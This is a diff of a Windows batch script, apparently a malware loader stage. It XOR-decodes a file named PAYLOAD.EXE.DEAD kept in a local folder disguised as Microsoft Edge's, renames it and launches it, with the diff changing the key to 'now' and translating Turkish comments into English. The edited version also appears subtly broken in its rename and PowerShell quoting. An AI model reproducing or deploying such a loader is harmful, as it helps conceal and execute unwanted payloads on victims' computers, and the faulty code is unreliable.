@@ -1,58 +1,56 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-:: Başlangıç
+rem Define file paths and other variables
 set "filePath=%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE.DEAD"
+set "tempFilePath=%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE"
+set "key=now"
 
-:: Dosya var mı kontrolü
+rem Check if the file exists
 if not exist "%filePath%" (
     echo File does not exist: %filePath%
     exit /b
 )
 
-:: Uzantı kontrolü
+rem Validate the file extension
 if /i not "%filePath:~-5%"==".dead" (
     echo The file does not have a .dead extension: %filePath%
     exit /b
 )
 
-:: Dosya çözme işlemi
+rem Decrypt the file
 echo Decrypting file %filePath%...
-call :EncryptDecryptFile "%filePath%"
-echo Decrypted: %filePath%
+call :EncryptDecryptFile "%filePath%" "%key%"
+echo File decrypted: %filePath%
 
-:: Yeni dosya yolu oluşturma
+rem Rename the file by removing the .dead extension
 set "newFilePath=%filePath:.dead=%"
 echo Original file path: %filePath%
 echo New file path: %newFilePath%
 
-:: Dosya adını değiştirme
-for %%F in ("%filePath%") do (
-    set "dir=%%~dpF"
-    set "filename=%%~nF"
-    set "extension=%%~xF"
-)
-
-ren "%filePath%" "%filename%%extension:~0,-5%"
+rem Rename the file
+ren "%filePath%" "%newFilePath%"
 timeout /t 2
 
+rem Launch the decrypted file
 echo File decrypted and renamed to: %newFilePath%
-
 color 07
-start "" "%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE"
+start "" "%newFilePath%"
+
 exit /b
 
+rem EncryptDecryptFile function: XOR encryption/decryption
 :EncryptDecryptFile
 set "inputFile=%~1"
+set "key=%~2"
 
-:: AES şifreleme çözme işlemi (PowerShell ile)
+rem Use PowerShell to perform the XOR encryption/decryption
 powershell -NoProfile -Command ^
-    "$key = '12345678901234567890123456789012';" ^  :: 32-byte (256-bit) anahtar kullanıyoruz
-    "$content = [System.IO.File]::ReadAllBytes(\"%inputFile%\");" ^
-    "$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key);" ^
+    "$key = [System.Text.Encoding]::UTF8.GetBytes('%key%');" ^
+    "$content = [System.IO.File]::ReadAllBytes('%inputFile%');" ^
     "for ($i = 0; $i -lt $content.Length; $i++) {" ^
-    "    $content[$i] = $content[$i] -bxor $keyBytes[$i %% $keyBytes.Length];" ^
+    "    $content[$i] = $content[$i] -bxor $key[$i % $key.Length];" ^
     "}" ^
-    "[System.IO.File]::WriteAllBytes(\"%inputFile%\", $content);"
+    "[System.IO.File]::WriteAllBytes('%inputFile%', $content);"
 
-Exit /b
+exit /b
